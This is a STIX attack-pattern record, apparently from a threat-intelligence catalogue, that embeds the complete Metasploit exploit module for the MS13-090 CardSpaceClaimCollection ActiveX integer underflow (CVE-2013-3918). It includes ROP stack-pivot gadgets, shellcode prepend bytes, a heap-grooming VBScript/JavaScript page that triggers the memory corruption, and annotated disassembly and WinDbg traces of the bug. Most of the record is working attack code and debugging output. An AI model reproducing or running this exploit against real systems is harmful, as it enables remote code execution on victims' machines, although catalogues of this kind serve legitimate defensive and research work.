{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f409d19-d9ed-4e39-bbf4-7f0c0d04f374",
    "created": "2024-08-14T16:43:45.443609Z",
    "modified": "2024-08-14T16:43:45.443614Z",
    "name": "\"MS13-090 CardSpaceClaimCollection ActiveX Integer Underflow\"",
    "description": " This module exploits a vulnerability on the CardSpaceClaimCollection class from the icardie.dll ActiveX control. The vulnerability exists while the handling of the CardSpaceClaimCollection object. CardSpaceClaimCollections stores a collection of elements on a SafeArray and keeps a size field, counting the number of elements on the collection. By calling the remove() method on an empty CardSpaceClaimCollection it is possible to underflow the length field, storing a negative integer. Later, a call to the add() method will use the corrupted length field to compute the address where write into the SafeArray data, allowing to corrupt memory with a pointer to controlled contents. This module achieves code execution by using VBScript as discovered in the wild on November 2013 to (1) create an array of html OBJECT elements, (2) create holes, (3) create a CardSpaceClaimCollection whose SafeArray data will reuse one of the holes, (4) corrupt one of the legit OBJECT elements with the described integer overflow and (5) achieve code execution by forcing the use of the corrupted OBJECT.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms13_090_cardspacesigninhelper.rb",
            "external_id": "ms13_090_cardspacesigninhelper.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3918"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/msrc/archive/2013/11/11/activex-control-issue-being-addressed-in-update-tuesday.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({\n    :ua_name    => HttpClients::IE,\n    :ua_minver  => \"8.0\",\n    :ua_maxver  => \"8.0\",\n    :javascript => true,\n    :os_name    => OperatingSystems::Match::WINDOWS_XP,\n# BrowserAutoPwn currently has a syntax error bug so we can't use classid and method,\n# so we have these commented out for now. But it's not so bad because by default\n# Windows XP has this ActiveX, and BrowserExploitServer's check will kick in.\n#    :classid    => \"{19916E01-B44E-4E31-94A4-4696DF46157B}\",\n#    :method     => \"requiredClaims\"\n  })\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-090 CardSpaceClaimCollection ActiveX Integer Underflow\",\n      'Description'    => %q{\n        This module exploits a vulnerability on the CardSpaceClaimCollection class from the\n        icardie.dll ActiveX control. The vulnerability exists while the handling of the\n        CardSpaceClaimCollection object. CardSpaceClaimCollections stores a collection of\n        elements on a SafeArray and keeps a size field, counting the number of elements on the\n        collection. By calling the remove() method on an empty CardSpaceClaimCollection it is\n        possible to underflow the length field, storing a negative integer. Later, a call to\n        the add() method will use the corrupted length field to compute the address where write\n        into the SafeArray data, allowing to corrupt memory with a pointer to controlled contents.\n        This module achieves code execution by using VBScript as discovered in the wild on\n        November 2013 to (1) create an array of html OBJECT elements, (2) create holes, (3) create\n        a CardSpaceClaimCollection whose SafeArray data will reuse one of the holes, (4) corrupt\n        one of the legit OBJECT elements with the described integer overflow and (5) achieve code\n        execution by forcing the use of the corrupted OBJECT.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',     # Vulnerability Discovery and exploit in the wild\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE',   '2013-3918'],\n          [ 'OSVDB', '99555' ],\n          [ 'BID',   '63631' ],\n          [ 'MSB',   'MS13-090' ],\n          [ 'URL',   'http://blogs.technet.com/b/msrc/archive/2013/11/11/activex-control-issue-being-addressed-in-update-tuesday.aspx' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 4096,\n          'DisableNops'    => true,\n          'BadChars'       => \"\\x00\",\n          # Patch the stack to execute the decoder...\n          'PrependEncoder' => \"\\x81\\xc4\\x0c\\xfe\\xff\\xff\", # add esp, -500\n          # Fix the stack again, this time better :), before the payload\n          # is executed.\n          'Prepend'        => \"\\x64\\xa1\\x18\\x00\\x00\\x00\" + # mov eax, fs:[0x18]\n                              \"\\x83\\xC0\\x08\"             + # add eax, byte 8\n                              \"\\x8b\\x20\"                 + # mov esp, [eax]\n                              \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\",  # add esp, -2000\n        },\n      'Platform'       => 'win',\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :activex => [\n            {\n              clsid: '{19916E01-B44E-4E31-94A4-4696DF46157B}',\n              method: 'requiredClaims'\n            }\n          ],\n          :os_name => OperatingSystems::Match::WINDOWS_XP\n        },\n      'Targets'        =>\n        [\n          [ 'Windows XP with IE 8',\n            {\n              'os_name'   => OperatingSystems::Match::WINDOWS_XP,\n              'ua_name'   => Msf::HttpClients::IE,\n              'ua_ver'    => '8.0',\n              'arch'      => ARCH_X86\n            }\n          ]\n        ],\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'Retries'              => false\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-11-08',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def exploit_template(cli, target_info)\n    stack_pivot = [\n      0x77c20433, # pop ebp, ret  # eax points here\n      0x77c15ed5  # xchg eax, esp # eip\n    ].pack(\"V*\")\n\n    symbols = {\n      \"CardSpaceSigninHelper\" => rand_text_alpha(5 + rand(5)),\n      \"get_code\"              => rand_text_alpha(5 + rand(5)),\n      \"code\"                  => rand_text_alpha(5 + rand(5)),\n      \"required_claims\"       => rand_text_alpha(5 + rand(5)),\n      \"massage_array\"         => rand_text_alpha(5 + rand(5)),\n      \"massage_array_length\"  => rand_text_alpha(5 + rand(5)),\n      \"zero\"                  => rand_text_alpha(5 + rand(5)),\n      \"underflow\"             => rand_text_alpha(5 + rand(5)),\n      \"my_code\"               => rand_text_alpha(5 + rand(5))\n    }\n\n    rop_payload = generate_rop_payload('msvcrt', get_payload(cli, target_info), {'target'=>'xp', 'pivot' => stack_pivot})\n    js_payload = Rex::Text.to_unescape(rop_payload)\n\n    html_template = %Q|\n    <html>\n    <head>\n    <META HTTP-EQUIV=\"PRAGMA\" CONTENT=\"NO-CACHE\">\n    <META HTTP-EQUIV=\"CACHE-CONTROL\" CONTENT=\"NO-CACHE\">\n    </head>\n    <body>\n    <object classid='clsid:19916E01-B44E-4E31-94A4-4696DF46157B' id='<%=symbols[\"CardSpaceSigninHelper\"]%>'></object>\n    <script language='JavaScript'>\n\n    function <%=symbols[\"get_code\"]%>(){\n      var <%=symbols[\"code\"]%> = unescape(\"<%=js_payload%>\");\n      return <%=symbols[\"code\"]%>;\n    }\n    </script>\n    <script language='vbscript'>\n    On Error Resume Next\n    Dim <%=symbols[\"massage_array_length\"]%>,<%=symbols[\"underflow\"]%>,<%=symbols[\"zero\"]%>\n    Dim <%=symbols[\"massage_array\"]%>(5493)\n    <%=symbols[\"massage_array_length\"]%> = 5493\n    <%=symbols[\"underflow\"]%> = -7\n    <%=symbols[\"zero\"]%> = 0\n\n    Set <%=symbols[\"required_claims\"]%> = <%=symbols[\"CardSpaceSigninHelper\"]%>.requiredClaims\n\n    For i = <%=symbols[\"zero\"]%> to <%=symbols[\"massage_array_length\"]%>\n      Set <%=symbols[\"massage_array\"]%>(i) = document.createElement(\"object\")\n    Next\n\n    For i = 4093 to <%=symbols[\"massage_array_length\"]%> Step 2\n      <%=symbols[\"massage_array\"]%>(i) = Null\n    Next\n\n    For i = <%=symbols[\"zero\"]%> to <%=symbols[\"underflow\"]%> Step -1\n      <%=symbols[\"required_claims\"]%>.remove(CLng(i))\n    Next\n\n    Dim <%=symbols[\"my_code\"]%>\n    <%=symbols[\"my_code\"]%> = <%=symbols[\"get_code\"]%>()\n    <%=symbols[\"required_claims\"]%>.add(<%=symbols[\"my_code\"]%>)\n\n    For i = <%=symbols[\"zero\"]%> = 0 to <%=symbols[\"massage_array_length\"]%>\n      if <%=symbols[\"massage_array\"]%>(i) <> Null Then\n        <%=symbols[\"massage_array\"]%>(i).focus\n      End If\n    Next\n\n    For i = <%=symbols[\"zero\"]%> = 0 to <%=symbols[\"massage_array_length\"]%>\n      <%=symbols[\"massage_array\"]%>(i) = Null\n    Next\n\n    </script></body></html>\n    |\n\n    return html_template, binding()\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Sending HTML...\")\n    send_exploit_html(cli, exploit_template(cli, target_info))\n  end\nend\n\n=begin\nThe CCardSpaceClaimCollection is abused. It is a 0x10 size object whose memory is allocated at:\n\n.text:0040A6E8                 and     dword ptr [edi], 0\n.text:0040A6EB                 push    ebx\n.text:0040A6EC                 push    esi\n.text:0040A6ED                 push    10h             ; unsigned int\n.text:0040A6EF                 mov     ebx, 8007000Eh\n.text:0040A6F4                 call    ??2@YAPAXI@Z    ; operator new(uint)\n\nThe interesting fields:\n\n0x0 : vftable\n0x4 : unknown\n0x8 : number of elements on the collection (size)\n0xc : pointer to the CCardSpaceClaimCollection elements stored on a SafeArray\n(http://msdn.microsoft.com/en-us/library/windows/desktop/ms221482(v=vs.85).aspx)\n\nBoth three fields are initialized to 0 / NULL when creating an instance of the object:\n\n.text:00409980 ; public: __thiscall CCardSpaceClaimCollection::CCardSpaceClaimCollection(void)\n.text:00409980                 xor     ecx, ecx\n.text:00409982                 mov     [eax+4], ecx\n.text:00409985                 mov     [eax+8], ecx\n.text:00409988                 mov     [eax+0Ch], ecx\n.text:0040998B                 retn\n\n(1) The first problem happens on CCardSpaceClaimCollection::remove, since it's possible to remove an element\nfrom a 0 length collection, underflowing the length field:\n\n.text:00409D46 loc_409D46:                             ; CODE XREF: CCardSpaceClaimCollection::remove(tagVARIANT *)+85\u0018j\n.text:00409D46                 dec     dword ptr [esi+8] ;  esi pointing to the CCardSpaceClaimCollection\n\nDebugging the underflow:\n\n0:017> bu icardie!CCardSpaceClaimCollection::remove+0xa0\n0:017> g\nModLoad: 033b0000 033c2000   C:\\WINDOWS\\system32\\icardie.dll\nModLoad: 63380000 63434000   C:\\WINDOWS\\system32\\jscript.dll\nModLoad: 034e0000 0354a000   C:\\WINDOWS\\system32\\vbscript.dll\nBreakpoint 0 hit\neax=03672280 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=00000000\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=00000000\n0:008> g\nBreakpoint 0 hit\neax=0367227c ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=ffffffff\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=ffffffff\n0:008> g\nBreakpoint 0 hit\neax=03672278 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffe\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=feffffff\n0:008> g\nBreakpoint 0 hit\neax=03672274 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffd\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fdffffff\n0:008> g\nBreakpoint 0 hit\neax=03672270 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffc\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fcffffff\n0:008> g\nBreakpoint 0 hit\neax=0367226c ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffb\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=fbffffff\n0:008> g\nBreakpoint 0 hit\neax=03672268 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffffa\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=faffffff\n0:008> g\nBreakpoint 0 hit\neax=03672264 ebx=0022012c ecx=00000000 edx=00000000 esi=0035da40 edi=fffffff9\neip=033b9d46 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl nz ac pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216\nicardie!CCardSpaceClaimCollection::remove+0xa0:\n033b9d46 ff4e08          dec     dword ptr [esi+8]    ds:0023:0035da48=f9ffffff\n0:008> g\n\n(2) The second problem happens on CCardSpaceClaimCollection::add\n\nFirst of all the SafeArray Container is get:\n\n.text:00409C0A                 mov     esi, [ebp+arg_0]\n.text:00409C0D                 call    ?GetInnerArray@CCardSpaceClaimCollection@@AAEPAUtagSAFEARRAY@@XZ ; C\n\n and its capacity checked, so if needed it's going to be resized\n\n.text:00409C20 loc_409C20:                             ; CODE XREF: CCardSpaceClaimCollection::add(tagVARIANT *)+48\u0018j\n.text:00409C20                 mov     ebx, [esi+8]    ; The number of elements\n.text:00409C23                 inc     ebx             ; The number of elements incremented\n.text:00409C24                 call    ?GrowInnerArrayIfRequired@CCardSpaceClaimCollection@@AAEJJ@Z ;\n\nIn order to check if the SafeArray needs to be resized GrowInnerArrayIfRequired checks\nthe length of the CCardSpaceClaimCollection(underflowed) against the capacity of the SafeArray,\nsince the comparision is signed, nothing is resized:\n\n0:008> g\nBreakpoint 4 hit\neax=00000000 ebx=fffffff9 ecx=00000009 edx=0000000a esi=0035e6b8 edi=00242b44\neip=036a9e41 esp=0201f3d0 ebp=0201f3dc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nicardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x2e:\n036a9e41 3bda            cmp     ebx,edx\n0:008> r ebx, edx\nebx=fffffff9 edx=0000000a\n\nSince the comparision is signed, nothing is resized:\n\n0:008> t\neax=00000000 ebx=fffffff9 ecx=00000009 edx=0000000a esi=0035e6b8 edi=00242b44\neip=036a9e43 esp=0201f3d0 ebp=0201f3dc iopl=0         nv up ei ng nz ac po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292\nicardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x30:\n036a9e43 7e1f            jle     icardie!CCardSpaceClaimCollection::GrowInnerArrayIfRequired+0x51 (036a9e64) [br=1]\n\nIn order to proceed to modify the SafeArray, \"add\" saves a pointer to the data (ppvData) into a local variable:\n\n.text:00409C2F                 lea     eax, [ebp+ppvData]\n.text:00409C32                 push    eax             ; ppvData\n.text:00409C33                 push    [ebp+psa]       ; psa\n.text:00409C36                 call    ds:__imp__SafeArrayAccessData@8 ; SafeArrayAccessData(x,x)\n\nThen an String witht the user controlled contents is created, and a pointer to the contents is stored\ninto the ppvData. Unfortunately, the underflowed length address is used to calculate where to store the\nthing:\n\n.text:00409C51                 push    dword ptr [edi+8] ; psz\n.text:00409C54                 call    ds:__imp__SysAllocString@4 ; SysAllocString(x)\n.text:00409C5A                 mov     ecx, [esi+8]\n.text:00409C5D                 mov     edx, [ebp+ppvData]\n.text:00409C60                 mov     [edx+ecx*4], eax ; edx pointer to ppvdata, ecx is the corrupted CCardSpaceClaimCollection length\n\nFinally the CCardSpaceClaimCollection size is incremented:\n.text:00409C63                 inc     dword ptr [esi+8]\n\nWhen debugging :\n\n0:008> t\neax=001f5884 ebx=00000000 ecx=fffffff8 edx=00000028 esi=0035e6b8 edi=00242b44\neip=036a9c5d esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nicardie!CCardSpaceClaimCollection::add+0x8e:\n036a9c5d 8b55f8          mov     edx,dword ptr [ebp-8] ss:0023:0201f3f0=10798a03\n0:008> t\n\nHere the underflow happens edx+ecx*4 points to 038a78f0, which is below 038a7910,\nwhere ppvData lives:\n\neax=001f5884 ebx=00000000 ecx=fffffff8 edx=038a7910 esi=0035e6b8 edi=00242b44\neip=036a9c60 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nicardie!CCardSpaceClaimCollection::add+0x91:\n036a9c60 89048a          mov     dword ptr [edx+ecx*4],eax ds:0023:038a78f0=00000000\n0:008> t\neax=001f5884 ebx=00000000 ecx=fffffff8 edx=038a7910 esi=0035e6b8 edi=00242b44\neip=036a9c63 esp=0201f3e4 ebp=0201f3f8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nicardie!CCardSpaceClaimCollection::add+0x94:\n036a9c63 ff4608          inc     dword ptr [esi+8]    ds:0023:0035e6c0=f8ffffff\n\nLater the overwritten object is used, its memory dereferenced and control of the execution flow is possible:\n\n0:008> g\n(b4c.b70): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=001f5884 ebx=00000000 ecx=038a78e0 edx=0201f5e4 esi=00000002 edi=036d150c\neip=cccccccc esp=0201f5b4 ebp=0201f5c0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\ncccccccc ??              ???\n0:008> dd ecx\n038a78e0  63ab1b18 00000002 6363fbe4 03894d38\n038a78f0  001f5884 00000000 00000000 00000000\n038a7900  00000000 00000000 00000000 00000000\n038a7910  00000000 00000000 00000000 00000000\n038a7920  00000000 00000000 00000000 00000000\n038a7930  00000000 00000000 e8319dff ff080100\n038a7940  63ab1b18 00000001 6363fbe4 03894f08\n038a7950  63767260 00000000 00000000 00020000\n0:008> db 001f5884\n001f5884  bb bb bb bb cc cc cc cc-cc cc cc cc cc cc cc cc  ................\n001f5894  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................\n001f58a4  cc cc cc cc cc cc cc cc-00 00 00 00 e6 7e a1 ea  .............~..\n001f58b4  00 01 08 ff 70 18 5c 75-2c 18 5c 75 02 00 00 00  ....p.\\u,.\\u....\n001f58c4  e8 ac 9c 02 00 00 00 80-f3 1b 5d 75 b8 58 1f 00  ..........]u.X..\n001f58d4  48 00 9c 02 84 14 5c 75-e8 ac 9c 02 1b 00 00 00  H.....\\u........\n001f58e4  e8 52 19 00 ed 7e a1 ea-00 01 08 ff 08 00 00 00  .R...~..........\n001f58f4  90 01 00 00 f0 00 00 00-00 00 00 00 01 00 00 00  ................\n=end\n",
    "x_mitre_disclosure_date": "2013-11-08",
    "x_mitre_platforms": [
        "win'"
    ]
}